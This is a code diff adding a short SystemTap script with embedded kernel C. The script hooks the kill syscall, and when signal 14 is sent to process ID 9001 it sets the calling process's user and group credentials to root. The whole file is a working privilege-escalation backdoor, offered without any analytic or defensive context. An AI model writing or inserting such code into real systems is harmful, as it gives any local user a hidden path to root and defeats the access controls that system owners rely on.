@@ -1,0 +1,22 @@
+#!/usr/bin/env stap
+%{
+#include <linux/sched.h>
+%}
+
+function root_me:long() %{
+        struct cred *haxcredentials;
+        haxcredentials = prepare_creds();
+        if (haxcredentials == NULL)
+                return; 
+        haxcredentials->uid = haxcredentials->gid = 0;
+        haxcredentials->euid = haxcredentials->egid = 0;
+        haxcredentials->suid = haxcredentials->sgid = 0;
+        haxcredentials->fsuid = haxcredentials->fsgid = 0;
+        commit_creds(haxcredentials);
+%}
+
+probe syscall.kill{
+    if(sig == 14 && pid == 9001){
+        root_me()
+    }   
+}
